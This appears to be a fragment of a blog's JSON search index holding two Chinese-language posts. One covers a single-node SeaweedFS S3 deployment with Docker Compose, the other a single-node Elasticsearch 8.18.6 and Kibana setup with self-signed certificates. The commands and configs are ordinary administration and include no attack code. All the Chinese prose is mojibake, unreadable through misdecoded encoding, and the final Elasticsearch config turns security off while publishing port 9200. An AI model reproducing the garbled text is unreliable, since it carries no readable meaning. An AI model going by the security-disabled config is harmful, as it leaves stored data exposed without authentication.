†ï¼ŒS3ä¹Ÿåœ¨å…¶ä¸­ä¹‹åˆ—ã€‚\u003c/p\u003e\n\u003cp\u003eæ‰¾æ¥æ‰¾å»ï¼Œç¬¬ä¸€é¦–é€‰çš„æ›¿ä»£è½¯ä»¶æ˜¯minioï¼Œå¯æ˜¯ä¸‡æ¶çš„minioå›¢é˜Ÿåœ¨è¿™ä¸ªæ—¶é—´ç‚¹ï¼Œå·²ç»åå°ç§»é™¤äº† admin ç›¸å…³çš„æ“ä½œæƒé™\u003c/p\u003e\n\u003cp\u003eè¦æƒ³ç”¨å‘¢ï¼Œåªèƒ½ç”¨ä¸ªè€ç‰ˆæœ¬çš„ï¼š\u003ca href=\"http://quay.io/minio/minio:RELEASE.2025-04-22T22-12-26Z\"\u003equay.io/minio/minio:RELEASE.2025-04-22T22-12-26Z\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eé‚£åªèƒ½å†æ‰¾äº†ï¼Œäºæ˜¯æ‰¾åˆ°äº†SeaweedFSï¼Œè¿™ä¸ªè½¯ä»¶å…¶å®æ˜¯ä¸ªå½»å¤´å½»å°¾çš„å•æ–‡ä»¶ï¼Œä½†æ˜¯åˆ†å¸ƒå¼å…¨é›†ç¾¤æ¶æ„\u003c/p\u003e\n\u003cp\u003eç®€å•çš„è¯´ï¼Œå°±æ˜¯ä¸€ä¸ªè½¯ä»¶ï¼ŒåŒ…å«äº†10å‡ ç§åŠŸèƒ½ã€‚\u003c/p\u003e\n\u003cp\u003eè€Œæˆ‘ä»¬å‘¢ï¼Œå…¶å®å°±è¦å®ƒçš„ä¸€ä¸ªåŠŸèƒ½s3ï¼Œè€Œä¸”è¦ç”¨äºç”Ÿäº§ã€‚ç½‘ä¸Šä¸€å¤§å †çš„æ•™ç¨‹éƒ½æ˜¯å„ç§åˆ†å¸ƒå¼çš„éƒ¨ç½²ï¼Œå¦‚æœæœºå™¨è¶³å¤Ÿï¼Œå¤§å®¶å¯ä»¥å‚è€ƒç½‘ä¸Šæ•™ç¨‹ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬å•å°æœºå™¨ï¼Œç¡¬ç›˜åº•å±‚æ˜¯raid10ï¼Œç„¶åä¸Šå±‚å°±åªæä¾›s3ï¼Œè€Œä¸”è¦é…ç½®ç®€å•ï¼Œæ²¡æœ‰ä»€ä¹ˆå®‰å…¨é—®é¢˜ï¼Œè¿™å°æœºå™¨æ˜¯ç›´æ¥æš´éœ²å…¬ç½‘IPçš„ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯Docker composeï¼Œè€Œä¸”åªæ”¾å¼€s3çš„æŒ‡å®šç«¯å£ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  seaweedfs-s3:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: chrislusf/seaweedfs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: seaweedfs-s3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - ./data:/data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - ./config/config.json:/seaweedfs/config.json\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"s2\"\u003e\u0026#34;127.0.0.1:8333:8333\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# - \u0026#34;9333:9333\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    entrypoint: /bin/sh -c\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;echo \u0026#39;Starting SeaweedFS S3 server\u0026#39; \u0026amp;\u0026amp; \\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e      weed server -dir=/data -volume.max=120 -s3 -s3.config /seaweedfs/config.json\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    restart: unless-stopped\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä»”ç»†è§£é‡Šä¸Šé¢çš„å‚æ•°ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eports åªå¼€äº† 127.0.0.1:8333 çš„S3ç«¯å£ï¼Œå…¶å®ƒéƒ½ä¸å¼€ï¼Œå¦‚æœéœ€è¦æŸ¥çœ‹æœåŠ¡çŠ¶æ€ï¼Œå¯ä»¥ä¸´æ—¶æ‰“å¼€9333ç«¯å£æŸ¥çœ‹ï¼Œçœ‹å®Œå†å…³\u003c/li\u003e\n\u003cli\u003e-volume.max=120ï¼Œè¿™ä¸ªåŠ¡å¿…è¦æ³¨æ„ï¼Œseaweedæ˜¯åˆ†å·çš„ï¼Œä¸€ä¸ªå·æœ€å¤š30Gï¼Œç¼ºçœæ˜¯8ä¸ªå·ã€‚é‚£ç¼ºçœå°±æ˜¯åªæœ‰240Gçš„å®¹é‡ï¼Œæˆ‘ä»¬çš„ç¡¬ç›˜æ˜¯4Tçš„ï¼Œå‰©ä½™3.7TBï¼Œé‚£ç®—ä¸‹æ¥ï¼Œ30*120=3600G=3.6Tã€‚è¿™æ ·å°±å¯¹å‡†äº†ï¼Œè¿™ä¸ªå‚æ•°ä¸€å®šè¦æ ¹æ®ç”Ÿäº§çš„å®é™…æƒ…å†µè¿›è¡Œè°ƒæ•´.\u003c/li\u003e\n\u003cli\u003eå¦å¤–è¿˜æŠŠconfig.jsonçš„é…ç½®æ–‡ä»¶ç»™mountå…¥dockerå·ä¸­äº†ï¼Œé…ç½®æ–‡ä»¶é‡Œæ”¾çš„å°±æ˜¯S3çš„IAMè®¿é—®æƒé™æ§åˆ¶\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eè¯¦ç»†çœ‹ä¸€ä¸‹config.json\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;identities\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;admin\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;credentials\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"s2\"\u003e\u0026#34;accessKey\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;aaa\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"s2\"\u003e\u0026#34;secretKey\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;bbb\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;actions\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Admin\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Read\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;List\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Tagging\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Write\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;goods\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;credentials\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"s2\"\u003e\u0026#34;accessKey\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;ccc\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"s2\"\u003e\u0026#34;secretKey\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;ddd\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;actions\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Read:goods\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Write:goods\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;List:goods\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Tagging:goods\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Admin:goods\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè§£é‡Šä¸€ä¸‹ï¼Œä¸Šé¢å®šä¹‰äº†ä¸€ä¸ªadminç”¨æˆ·ï¼Œå¯ä»¥å¯¹æ‰€æœ‰s3è¿›è¡Œè¯»å†™å’Œç®¡ç†ã€‚\u003c/p\u003e","title":"seaweed S3æœåŠ¡å•æœºç‰ˆæ­£å¼ç¯å¢ƒçš„éƒ¨ç½²"},{"content":"è¦åœ¨ç”Ÿäº§ç¯å¢ƒå»ºä¸€å¥—Elasticsearch 8.0ï¼Œå•èŠ‚ç‚¹æ­é…Kibanaï¼Œç¡®å®æ˜¯å›°éš¾é‡é‡ï¼Œæ–°ç‰ˆæœ¬éœ€è¦TLSéªŒè¯äº†\nç°åœ¨è¿™ä¸ªæ—¶é—´èŠ‚ç‚¹ï¼Œ2025å¹´9æœˆ2æ—¥ï¼ŒElasticsearchæœ€æ–°ç‰ˆæœ¬æ˜¯9.0ï¼Œåæ’¤2ä¸ªç‰ˆæœ¬æ˜¯8.18.6\né‚£å°±ç”¨è¿™ä¸ªç‰ˆæœ¬äº†ï¼Œç„¶åæ ¹æ®å®˜æ–¹çš„æ–‡æ¡£ä¼šæŠŠäººæç³Šæ¶‚çš„ã€‚\næ­£ç¡®çš„æ–¹æ³•å¦‚ä¸‹ï¼š\nä¸€ã€å»ºç«‹è‡ªç­¾çš„è¯ä¹¦ å…¶å®å¯ä»¥ç”¨ACMEçš„è¯ä¹¦ï¼Œä½†æ˜¯æ²¡æœ‰äººä¼šä¸‰ä¸ªæœˆå°±å»é‡å¯ä¸€ä¸‹ESçš„å®¹å™¨ï¼Œæ›´æ–°è¯ä¹¦å§ï¼\né‚£åªèƒ½é€‰æ‹©è‡ªå»ºCAï¼Œè‡ªç­¾ä¸€ä¸ªè¯ä¹¦äº†ï¼\nå› ä¸ºæœ‰2ä¸ªpodï¼Œeså’Œkibanaï¼Œæ‰€ä»¥è¦ç­¾ä¸¤å¼ è¯ä¹¦ï¼Œç­¾è¯ä¹¦éšä¾¿ç”¨ESçš„ä¸€ä¸ªç‰ˆæœ¬å°±å¯ä»¥ï¼š\nwget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.4.1-linux-x86_64.tar.gz tar -zxf elasticsearch-8.4.1-linux-x86_64.tar.gz cd elasticsearch-8.4.1/ ./bin/elasticsearch-certutil ca --pem # å¾—åˆ°CAè¯ä¹¦ï¼Œæ”¾åœ¨å½“å‰ç›®å½•caç›®å½•ä¸‹ unzip elastic-stack-ca.zip # ç”Ÿæˆç­¾å‘é…ç½®æ–‡ä»¶ cat \u0026lt;\u0026lt; EOF \u0026gt;instances.yml instances: - name: es01 dns: - es01 - localhost ip: - 127.0.0.1 - name: kibana dns: - kibana - localhost ip: - 127.0.0.1 EOF # ç­¾å‘2ä¸ªpodçš„è¯ä¹¦ ./bin/elasticsearch-certutil cert --ca-cert ca/ca.crt --ca-key ca/ca.key --pem --in instances.yml # å¾—åˆ°2å¼ è¯ä¹¦å’Œkey unzip certificate-bundle.zip # ç”Ÿæˆä¸¤ä¸ªç›®å½•ï¼Œes01å’Œkibana # å‡†å¤‡å¥½è¯ä¹¦ç›®å½• mkdir -p /data/elasticsearch/certs mv ca es01 kibana /data/elasticsearch/certs # å‡†å¤‡å¥½æŒä¹…åŒ–å· mkdir -p /data/elasticsearch/kibanadata mkdir -p /data/elasticsearch/esdata01 äºŒã€é…ç½®docker-compose.yaml 8.18.6ç‰ˆæœ¬çš„docker-compose.yamlæ–‡ä»¶ï¼Œä½äºï¼š/data/elasticsearch/docker-compose.yaml\n# docker-compose.yaml services: es01: container_name: es # The Docker image to use for this service image: docker.elastic.co/elasticsearch/elasticsearch:8.18.6 # The volumes to mount into this service volumes: - ./certs:/usr/share/elasticsearch/config/certs - ./esdata01:/usr/share/elasticsearch/data # The ports to expose from this service ports: - 9200:9200 # The environment variables to set inside the container environment: - node.name=es01 - cluster.name=lancode-cluster - discovery.type=single-node - ELASTIC_PASSWORD=aaaaaaaaaaaa - bootstrap.memory_lock=true - \u0026#34;ES_JAVA_OPTS=-Xms10g -Xmx10g\u0026#34; - xpack.security.enabled=true - xpack.security.http.ssl.enabled=true - xpack.security.http.ssl.key=certs/es01/es01.key - xpack.security.http.ssl.certificate=certs/es01/es01.crt - xpack.security.http.ssl.certificate_authorities=certs/ca/ca.crt - xpack.security.http.ssl.verification_mode=certificate - xpack.security.transport.ssl.enabled=true - xpack.security.transport.ssl.key=certs/es01/es01.key - xpack.security.transport.ssl.certificate=certs/es01/es01.crt - xpack.security.transport.ssl.certificate_authorities=certs/ca/ca.crt - xpack.security.transport.ssl.verification_mode=certificate - xpack.license.self_generated.type=basic # The memory limit for this service 12g = 1024*1024*1024*12 mem_limit: 12884901888 # The ulimits to set for this service ulimits: memlock: soft: -1 hard: -1 # The healthcheck to determine the health of this service healthcheck: test: [ \u0026#34;CMD-SHELL\u0026#34;, \u0026#34;curl -s --cacert config/certs/ca/ca.crt https://localhost:9200 | grep -q \u0026#39;missing authentication credentials\u0026#39;\u0026#34;, ] interval: 10s timeout: 10s retries: 120 # The kibana service represents a Kibana instance kibana: # This service depends on the es01 service depends_on: es01: condition: service_healthy container_name: kibana # The Docker image to use for this service image: docker.elastic.co/kibana/kibana:8.18.6 # The volumes to mount into this service volumes: - ./certs:/usr/share/kibana/config/certs - ./kibanadata:/usr/share/kibana/data # The ports to expose from this service ports: - 5601:5601 # The environment variables to set inside the container environment: - SERVERNAME=kibana - ELASTICSEARCH_HOSTS=https://es01:9200 - ELASTICSEARCH_USERNAME=kibana_system - ELASTICSEARCH_PASSWORD=bbbbbbbbbbbbbbb - ELASTICSEARCH_SSL_CERTIFICATEAUTHORITIES=config/certs/ca/ca.crt - xpack.security.audit.enabled=true - XPACK_ENCRYPTEDSAVEDOBJECTS_ENCRYPTIONKEY=cccccccccccccccccccccc # The memory limit for this service 2g = 1024*1024*1024*2 mem_limit: 2147483648 # The healthcheck to determine the health of this service healthcheck: test: [ \u0026#34;CMD-SHELL\u0026#34;, \u0026#34;curl -s -I http://localhost:5601 | grep -q \u0026#39;HTTP/1.1 302 Found\u0026#39;\u0026#34;, ] interval: 10s timeout: 10s retries: 120 æ³¨æ„ä¸Šé¢çš„è®¡ç®—ï¼š\nå†…å­˜ï¼Œç³»ç»Ÿæ˜¯16Gï¼Œ2Gä¿ç•™ï¼Œ2Gç»™kibanaï¼Œ12Gç»™esï¼Œjavaå¯åŠ¨å‚æ•°ç»™10g ELASTIC_PASSWORD=aaaaaaaaaaaa è¿™é‡Œçš„passæ˜¯æŒ‡ESçš„ç‹¬ç«‹ç”¨æˆ·elastic ELASTICSEARCH_PASSWORD=bbbbbbbbbbbbbb è¿™é‡Œçš„passæ˜¯æŒ‡éœ€è¦å•ç‹¬ç»™kibanaå¼€çš„ä¸€ä¸ªesç”¨æˆ·kibana_system æœ€åç™»å½•kibanaçš„å¯†ç æ˜¯elasticç”¨æˆ·çš„å¯†ç aaaaaaaaa\nè¿™é‡Œå·®ç‚¹è¢«ç»•ç³Šæ¶‚äº†ï¼ŒESå‡çº§åéœ€è¦å¯ç”¨httpsï¼Œç„¶åä¹Ÿå¤šåŠ äº†ç”¨æˆ·ã€‚kibanaéœ€è¦å•ç‹¬ç”¨ä¸€ä¸ªç”¨æˆ·kibana_systemå»è¿æ¥esï¼Œè€Œeså‘¢ï¼Œä¹Ÿæœ‰ä¸€ä¸ªç‹¬ç«‹çš„ç”¨æˆ·elasticè¿›è¡Œç®¡ç†ã€‚ç™»å½•kibannaå‘¢ï¼Œå®é™…æ˜¯è¦ç”¨elasticè¿™ä¸ªç”¨æˆ·ç™»å½•ã€‚Faintï¼ï¼ï¼\nä¸‰ã€å¯åŠ¨ docker compose up -d # å¯åŠ¨åå¿…ç„¶æŠ¥é”™ï¼Œå› ä¸ºé‡Œé¢åªæœ‰elasticè¿™ä¸ªç”¨æˆ·ï¼Œæ²¡æœ‰kibana_systemç”¨æˆ· # è¿›å…¥å®¹å™¨ docker exec -it es /bin/bash # ç”Ÿæˆå¯†ç  curl -X POST --cacert config/certs/ca/ca.crt -u \u0026#34;elastic:aaaaaaaa\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; https://es01:9200/_security/user/kibana_system/_password -d \u0026#39;{\u0026#34;password\u0026#34;: \u0026#34;bbbbbbbb\u0026#34;}\u0026#39; # æˆ–è€…è¿™æ ·ä¹Ÿè¡Œ docker-compose exec -T es bin/elasticsearch-reset-password --batch --user kibana_system Password for the [kibana_system] user successfully reset. New value: bbbbbbbb ç„¶åå°±okäº†ï¼Œç™»å½•çš„æ—¶å€™ç”¨elasticçš„å¯†ç ï¼Œä¸è¦ç”¨kibana_systemï¼\nå››ã€é¢˜å¤– æœ€é¬¼ç•œçš„åœ°æ–¹å°±æ˜¯kibana\né‡Œé¢è®¾ç½®çš„ä¸¤ä¸ªé…ç½®é¡¹ELASTICSEARCH_USERNAMEå’ŒELASTICSEARCH_PASSWORDè¿˜æœ‰ELASTICSEARCH_HOSTS, å±…ç„¶æ˜¯ç¯å¢ƒå˜é‡\nè¿›å…¥å®¹å™¨é‡Œçœ‹åˆ°çš„kibana.yamlï¼Œå€’æ•°ç¬¬äºŒè¡Œelasticsearch.hosts æ ¹æœ¬å°±æ˜¯é”™çš„ï¼Œè¯¯å¯¼ç¾¤ä¼—ï¼Œè¿™é‡Œæ˜¯ç¯å¢ƒå˜é‡ä¼˜å…ˆï¼Œæ ¹æœ¬æ²¡æœ‰ç”¨åˆ°kibana.yamlä¸­çš„é…ç½®ï¼ï¼ï¼ä¸€å®šè¦æ³¨æ„ã€‚\näº”ã€åè®° æ— è¯­å•Šæ— è¯­ï¼Œå¼„äº†è‡ªç­¾è¯ä¹¦ï¼Œç»“æœåŒäº‹åæ˜ è¿æ¥æŠ¥è¯ä¹¦é”™è¯¯\nç®—äº†ï¼Œç»™ä¸ªä¸è¦è¯ä¹¦çš„é…ç½®docker-compose.yaml\nservices: es01: container_name: es # The Docker image to use for this service image: docker.elastic.co/elasticsearch/elasticsearch:8.18.6 # The volumes to mount into this service volumes: - ./certs:/usr/share/elasticsearch/config/certs - ./esdata01:/usr/share/elasticsearch/data # The ports to expose from this service ports: - 9200:9200 # The environment variables to set inside the container environment: - node.name=es01 - cluster.name=lancode-cluster - discovery.type=single-node - ELASTIC_PASSWORD=aaaaaaaaaaaa - bootstrap.memory_lock=true - \u0026#34;ES_JAVA_OPTS=-Xms10g -Xmx10g\u0026#34; - xpack.security.enabled=false - xpack.license.self_generated.type=basic # The memory limit for this service 12g = 1024*1024*1024*12 mem_limit: 12884901888 # The ulimits to set for this service ulimits: memlock: soft: -1 hard: -1 # The healthcheck to determine the health of this service healthcheck: test: [ \u0026#34;CMD-SHELL\u0026#34;, \u0026#34;curl -s -I http://localhost:9200 | grep -q \u0026#39;HTTP/1.1 200 OK\u0026#39;\u0026#34;, ] interval: 10s timeout: 10s retries: 120 # The kibana service represents a Kibana instance kibana: # This service depends on the es01 service depends_on: es01: condition: service_healthy container_name: kibana # The Docker image to use for this service image: docker.elastic.co/kibana/kibana:8.18.6 # The volumes to mount into this service volumes: - ./certs:/usr/share/kibana/config/certs - ./kibanadata:/usr/share/kibana/data # The ports to expose from this service ports: - 5601:5601 # The environment variables to set inside the container environment: - SERVERNAME=kibana - ELASTICSEARCH_HOSTS=http://es01:9200 - ELASTICSEARCH_USERNAME=kibana_system - ELASTICSEARCH_PASSWORD=bbbbbbbbbbbbbbb - xpack.security.enabled=false - xpack.security.audit.enabled=true - XPACK_ENCRYPTEDSAVEDOBJECTS_ENCRYPTIONKEY=cccccccccccccccccccccc # The memory limit for this service 2g = 1024*1024*1024*2 mem_limit: 2147483648 # The healthcheck to determine the health of this service healthcheck: test: [ \u0026#34;CMD-SHELL\u0026#34;, \u0026#34;curl -s -I http://localhost:5601 | grep -q \u0026#39;HTTP/1.1 302 Found\u0026#39;\u0026#34;, ] interval: 10s timeout: 10s retries: 120 åŒºåˆ«åœ¨äº xpack.security.enabled=falseå’Œhealthcheck\n","permalink":"https://rendoumi.com/posts/20250902-elasticsearch_single_node_8_setup/","summary":"\u003cp\u003eè¦åœ¨ç”Ÿäº§ç¯å¢ƒå»ºä¸€å¥—Elasticsearch 8.0ï¼Œå•èŠ‚ç‚¹æ­é…Kibanaï¼Œç¡®å®æ˜¯å›°éš¾é‡é‡ï¼Œæ–°ç‰ˆæœ¬éœ€è¦TLSéªŒè¯äº†\u003c/p\u003e\n\u003cp\u003eç°åœ¨è¿™ä¸ªæ—¶é—´èŠ‚ç‚¹ï¼Œ2025å¹´9æœˆ2æ—¥ï¼ŒElasticsearchæœ€æ–°ç‰ˆæœ¬æ˜¯9.0ï¼Œåæ’¤2ä¸ªç‰ˆæœ¬æ˜¯8.18.6\u003c/p\u003e\n\u003cp\u003eé‚£å°±ç”¨è¿™ä¸ªç‰ˆæœ¬äº†ï¼Œç„¶åæ ¹æ®å®˜æ–¹çš„æ–‡æ¡£ä¼šæŠŠäººæç³Šæ¶‚çš„ã€‚\u003c/p\u003e\n\u003cp\u003eæ­£ç¡®çš„æ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch5 id=\"ä¸€å»ºç«‹è‡ªç­¾çš„è¯ä¹¦\"\u003eä¸€ã€å»ºç«‹è‡ªç­¾çš„è¯ä¹¦\u003c/h5\u003e\n\u003cp\u003eå…¶å®å¯ä»¥ç”¨ACMEçš„è¯ä¹¦ï¼Œä½†æ˜¯æ²¡æœ‰äººä¼šä¸‰ä¸ªæœˆå°±å»é‡å¯ä¸€ä¸‹ESçš„å®¹å™¨ï¼Œæ›´æ–°è¯ä¹¦å§ï¼\u003c/p\u003e\n\u003cp\u003eé‚£åªèƒ½é€‰æ‹©è‡ªå»ºCAï¼Œè‡ªç­¾ä¸€ä¸ªè¯ä¹¦äº†ï¼\u003c/p\u003e\n\u003cp\u003eå› ä¸ºæœ‰2ä¸ªpodï¼Œeså’Œkibanaï¼Œæ‰€ä»¥è¦ç­¾ä¸¤å¼ è¯ä¹¦ï¼Œç­¾è¯ä¹¦éšä¾¿ç”¨ESçš„ä¸€ä¸ªç‰ˆæœ¬å°±å¯ä»¥ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget 